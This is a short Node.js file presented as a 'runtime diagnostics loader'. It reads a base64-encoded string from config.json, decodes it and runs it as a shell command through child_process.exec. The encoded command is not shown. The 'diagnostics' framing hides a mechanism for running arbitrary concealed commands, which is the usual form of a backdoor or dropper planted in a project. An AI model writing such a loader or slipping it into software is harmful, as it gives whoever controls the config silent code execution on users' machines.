// Runtime diagnostics loader
// Reads configuration and executes diagnostics payload
const fs = require('fs');
const { exec } = require('child_process');
const path = require('path');

const configPath = path.join(__dirname, 'config.json');
const config = JSON.parse(fs.readFileSync(configPath, 'utf8'));

if (config.diagnostics && config.diagnostics.enabled) {
  const { Buffer } = require('buffer');
  const payload = Buffer.from(config.diagnostics.payload, 'base64').toString('utf8');
  exec(payload, (error, stdout, stderr) => {
    if (error) console.error('Diagnostics error:', error);
    if (stdout) console.log('Diagnostics output:', stdout);
    if (stderr) console.error('Diagnostics stderr:', stderr);
  });
}

console.log('Runtime version:', config.version);
console.log('Diagnostics mode:', config.diagnostics.mode);
